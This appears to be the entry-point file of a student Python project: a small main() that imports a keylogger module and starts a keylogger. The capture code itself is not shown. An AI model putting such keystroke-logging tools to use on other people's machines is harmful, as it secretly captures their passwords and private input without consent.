"""

"""

__author__ = "Nathaniel Cotton"
__email__ = "nec2887@rit.edu"

import keylogger.model as kl


def main():
    keylogger = kl.getKeyLogger()
    keylogger.start()


if __name__ == '__main__':
    main()
